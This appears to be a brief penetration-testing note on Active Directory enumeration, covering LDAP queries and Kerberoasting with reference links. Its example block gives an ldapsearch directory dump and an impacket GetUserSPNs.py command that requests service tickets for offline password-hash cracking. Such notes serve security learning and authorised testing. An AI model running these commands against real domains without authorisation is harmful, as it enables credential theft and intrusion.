# Active Directory Enumeration

This note covers basic AD enumeration techniques.

## LDAP Queries

Use ldapsearch to enumerate users and groups in the domain.

## Kerberoasting

Request service tickets to extract password hashes offline.

## Example Commands

```bash
ldapsearch -x -h dc.example.com -b "dc=example,dc=com"
GetUserSPNs.py -request -dc-ip 10.10.10.5 domain.local/user
```

## References

- Microsoft documentation: https://microsoft.com/docs
- Tool repository: https://github.com/SecureAuthCorp/impacket
- Exploit database: https://exploit-db.com
